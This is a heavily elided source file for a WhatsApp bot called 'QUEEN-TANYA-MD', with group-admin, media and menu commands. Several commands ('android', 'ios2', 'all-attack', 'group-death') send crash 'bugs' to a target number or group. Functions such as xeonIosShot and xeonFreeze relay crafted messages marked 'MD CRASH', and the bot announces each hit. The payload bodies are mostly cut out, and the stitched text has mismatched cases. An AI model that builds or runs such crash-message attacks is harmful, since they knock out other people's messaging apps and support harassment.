...
await GlobalTechInc.sendMessage(from, {text: xeonlod[i], edit: key });
        ...
        if (autobio) {
            GlobalTechInc.updateProfileStatus(`『 👑QUEEN -TANYA-ＭＤ』 online By ${ownername}`).catch(_ => _)
        }
...
case 'detect':
 {
    ...
    if (args[0] === 'on') {
        ...
        replyglobal('Bot 『 👑QUEEN -TANYA-ＭＤ』 Anti-link has been enabled for this group.');
    } else if (args[0] === 'off') {
        antilink.disableAntiLink(m.chat, _antilink);
        replyglobal('Bot 『 👑QUEEN -TANYA-ＭＤ』 Anti-link has been disabled for this group.');
    } else {
...
break;
            ...
            case 'restart':
                if (!isCreator) return replyglobal(mess.owner)
                replyglobal('Bot 『 👑QUEEN -TANYA-ＭＤ』 in Process....')
            ...
            case 'autoread':
                ...
                if (q === 'on') {
                    autoread = true
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed autoread to ${q}`)
                } else if (q === 'off') {
                    autoread = false
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed autoread to ${q}`)
                }
                ...
                if (q === 'on') {
                    autoTyping = true
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed auto-typing to ${q}`)
                } else if (q === 'off') {
                    autoTyping = false
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed auto-typing to ${q}`)
                }
                ...
                if (q === 'on') {
                    autoRecording = true
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed auto-recording to ${q}`)
                } else if (q === 'off') {
                    autoRecording = false
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed auto-recording to ${q}`)
                }
                ...
                if (q === 'on') {
                    autorecordtype = true
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 changed auto recording and typing to ${q}`)
                } else if (q === 'off') {
    ...
    case 'autostatusview':{
            ...
            case 'autobio':
                ...
                if (q == 'on') {
                    autobio = true
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    autobio = false
                    replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Changed AutoBio To ${q}`)
                }
                ...
                for (let i of anu) {
                    ...
                    GlobalTechInc.sendMessage(i, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: 'Broadcast By 👑 QUEEN-TANYA-MD',
            ...
            case 'all':
                ...
                let teks = `*\`『 QUEEN -TANYA👑- ＭＤ』👥ALL MEMBERS TAGGED\`*
 
                 📄 *Message : \`${q ? q : 'blank'}\`*\n> *Don\'t mind my owner for want to checking members😏😁*\n ${readmore}`
          ...
          case 'tag':
            ...
            case 'resetlink':
                ...
                await GlobalTechInc.groupRevokeInvite(m.chat)
                    .then(res => {
                        replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Reset, Group Invite Link Successfully ${groupMetadata.subject}`)
...
case 'taste': {
    ...
    respon = `
『 👑QUEEN -TANYA-ＭＤ』 response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
    ...
    await GlobalTechInc.sendMessage(m.chat, {
        ...
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `${latensi.toFixed(4)} Second of 『 👑QUEEN -TANYA-ＭＤ』 time`,
...
case 'check':
    ...
    await GlobalTechInc.sendMessage(m.chat, {
        ...
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `『 👑QUEEN -TANYA-ＭＤ』 created by ICONICS-TECH`,
                thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
    ...
    break
            ...
            case 'file':
                GlobalTechInc.sendMessage(m.chat, {
                    text: `\`Hello ${pushname}\`\n*join our link below to get yours*\n*https://chat.whatsapp.com/LyFPHDvc5vMCglUFjv7Rlp*\n* my owner number [+263716304574]*`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `This is ${botname} Created by iconics-md-bot`,
                            thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
...
GlobalTechInc.sendMessage(from, { text : `『 👑QUEEN -TANYA-ＭＤ』\n> Hello @${sender.split("@")[0]}, 🙄That is 『 👑QUEEN -TANYA-ＭＤ』 owner`, mentions: [sender]}, { quoted: repf })
}
break
            case 'sticker':
            case 'stiker':
...
break
            ...
            case 'addimage': {
                ...
                fs.unlinkSync(delb)
                replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 added Image\nTo Check Type ${prefix}listimage`)
            }
            break
            case 'delimage': {
                if (!isPremium) return replyglobal(mess.prem)
                ...
                replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Deleted Image ${q}`)
            }
            break
            case 'addsticker': {
                if (!isPremium) return replyglobal(mess.prem)
            ...
            case 'delsticker': {
                ...
                replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replyglobal(mess.prem)
                ...
                fs.unlinkSync(delb)
                replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Added Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replyglobal(mess.prem)
                ...
                replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replyglobal(mess.prem)
...
fs.unlinkSync(delb)
replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Added zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
...
fs.unlinkSync(delb)
replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Added the apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
...
replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 deleted Apk ${teks}`)
}
}
break
case 'listapk': {
...
fs.unlinkSync(delb)
replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 Added Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
...
replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
...
case "android": {
  ...
  sendMessageWithMentions(
    "Bot 『 👑QUEEN -TANYA-ＭＤ』 Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* 😂\n\nPause 2 minutes so that 『 👑QUEEN -TANYA-ＭＤ』 won't stop on your panel.", 
    [whatsappNumber]
  );
}
break;
...
case "ios2":
  {
	if (!isPremium) return replyglobal(mess.prem)
    if (!isBot) {
      return replyglobal("*This feature is for the 『 👑QUEEN -TANYA-ＭＤ』 only!*");
    }
    if (!text){
  ...
  sendMessageWithMentions(
    ...
    " Using *" + command + "* ✅\n\nPause 2 minutes so thatt『 👑QUEEN -TANYA-ＭＤ』 wont stop on your panel.", 
    [whatsappNumber]
  );
}
break;
...
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  async function xeonIosShot(jid) {
					...
					const crasoh = await GlobalTechInc.relayMessage(jid,
						{
							extendedTextMessage: {
								text: '#『 👑QUEEN -TANYA-ＭＤ』 MD CRASH ☠️🔥',
								matchedText: 'LEGALLY WRONG, ETHICALLY RIGHT',
								canonicalUrl: 'https://example.com',
								description: '#『 👑QUEEN -TANYA-ＭＤ』 MD CRASH ☠️🔥',
								title: '#『 👑QUEEN -TANYA-ＭＤ』 MD CRASH ☠️🔥',
								textArgb: 0xff000000,
...
await replyglobal(`Bot 『 👑QUEEN -TANYA-ＭＤ』 In process....`)
            await xeonIosShot(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that 『 👑QUEEN -TANYA-ＭＤ』 won't stop on panel.", 
    [whatsappNumber]
  );
            }
...
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  async function xeonBugPay(jid){
    ...
    [whatsappNumber]
				...
				break;
		case 'samsung': case 'all': case 'all-attack': case 'web': case 'doublekill': case '💀': case '☠️': {
if (!isPremium) return replyglobal(mess.prem)
...
await xeonFreeze(m.chat);
	...
	break
	case 'bkackmgc': case 'group-death': case 'group-end': {
		if (!isPremium) return replyglobal(mess.prem)
		const xeonimage = {
    title: "🇹🇿Danny🤖; ",
    hasMediaAttachment: true,
...
case 'ban': case 'tempban': {
  ...
  sendMessageWithMentions(
    "The user us banned temporarily by 『 👑QUEEN -TANYA-ＭＤ』 @" + xeonMention.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that 『 👑QUEEN -TANYA-ＭＤ』 won't stop on panel.", 
    [xeonMention]
  );
  try {
...
┊┴│  
┊➮│▧  𝚑𝚎𝚕𝚕𝚘  ${pushname}
┊➮│▧  bot still running Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
┊➮│▧  
┊➮│▧ 𝚐𝚛𝚘𝚞𝚙-𝚌𝚑𝚊𝚝 :https://chat.whatsapp.com/LyFPHDvc5vMCglUFjv7Rlp
┊➮│▧ 
┊➮│▧ 𝚌𝚑𝚊𝚗𝚗𝚎𝚕:https://whatsapp.com/channel/0029ValX2Js9RZAVtDgMYj0r
┊➮│▸
┬   │> 𝒄𝒓𝒆𝒂𝒕𝒆𝒅 𝒃𝒚 𝒊𝒄𝒐𝒏𝒊𝒄𝒔-𝒕𝒆𝒄𝒉
│   ╰────────────···◈
└──────────────────···◈
                    𝑩𝑶𝑻  𝑰𝑵𝑻𝑹𝑶𝑫𝑼𝑪𝑻𝑰𝑶𝑵
𝚀𝚞𝚎𝚎𝚗-𝚝𝚊𝚗𝚢𝚊 𝚗𝚘𝚝 𝚊𝚕𝚕𝚘𝚠𝚎𝚍 𝚝𝚘 𝚞𝚜𝚎𝚍 𝚋𝚊𝚍𝚕𝚢 𝚌𝚘𝚖𝚖𝚊𝚗𝚍𝚜 𝚘𝚝𝚑𝚎𝚛𝚠𝚒𝚜𝚎 𝚝𝚑𝚎 𝚜𝚎𝚛𝚟𝚎𝚛 𝚠𝚒𝚝𝚑 𝚜𝚑𝚘𝚠𝚝𝚘𝚠𝚗 𝚏𝚘𝚛𝚎𝚟𝚎𝚛
 
𝚀𝚞𝚎𝚎𝚗-𝚝𝚊𝚗𝚢𝚊 𝚗𝚘𝚝 𝚊𝚕𝚕𝚘𝚠𝚎𝚍 𝚝𝚘 𝚋𝚞𝚐 𝚘𝚝𝚑𝚎𝚛 𝚠𝚒𝚝𝚑𝚘𝚞𝚝 𝚜𝚙𝚊𝚖
                    𝑩𝑶𝑻  𝑯𝑰𝑺𝑻𝑶𝑹𝒀 
𝑸𝑼𝑬𝑬𝑵 𝑻𝑨𝑵𝒀𝑨 𝑭𝑶𝑼𝑵𝑫𝑬𝑹   𝑰𝑻𝑺 𝑰𝑪𝑶𝑵𝑰𝑪-𝑻𝑬𝑪𝑯 𝑾𝑯𝑶 𝑫𝑨𝑻𝑰𝑵𝑮 𝑾𝑰𝑻𝑯𝑺 𝑪𝑼𝑻𝑬 𝑮𝑰𝑹𝒍 𝑪𝑨𝑳𝑳 𝑻𝑨𝑵𝒀𝑨. 𝑨𝑭𝑻𝑬𝑹 𝑺𝑶𝑴𝑬𝑻𝑰𝑴𝑬 𝑰𝑪𝑶𝑵𝑰𝑪 𝑩𝑼𝑰𝑳𝑻 𝑩𝑶𝑻 𝑭𝑶𝑹 𝑯𝑰𝑺 𝑮𝑭 
 
            𝐓𝐇𝐀𝐍𝐊𝐒 𝐅𝐎𝐑 𝐔𝐒𝐈𝐍𝐆𝐒 𝐌𝐘 𝐆𝐅 𝐁𝐎𝐓
 

𝐶𝑅𝐸𝑎𝑇𝐸𝐷 𝐵𝑌 𝐼𝐶𝑂𝑁𝐼𝐶-𝑇𝐸𝐶𝐻
    ...
    await GlobalTechInc.sendMessage(m.chat, {
        ...
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `${botname}`,
                body: `『 👑QUEEN -TANYA-ＭＤ』 created by iconics-md-bot`,
                thumbnailUrl: 'https://files.catbox.moe/f6j3fl.jpeg',
                sourceUrl: global.link,
                mediaType: 1,
                renderLargerThumbnail: true
...
├─────────────────────────┤
│ *Hello* \`${pushname}\`, *👋*                      
│ *My name is 『 QUEEN -TANYA👑- ＭＤ』*\nMADE BY iconics-TECH*                   
╰─────────────────────────╯
╭───[ \`𝐌𝐀𝐈𝐍 𝐌𝐄𝐍𝐔\` ]────╮
│ ◆ *list*                                      
│ ◆ *menu*                                        
...
> 『 👑QUEEN -TANYA-ＭＤ』is not for sale                     
> Created by iconics 🫡                   
> ©️ ICONIC technology                           
┗━━━━━━━━━━━━━━━━━━━━┛
`
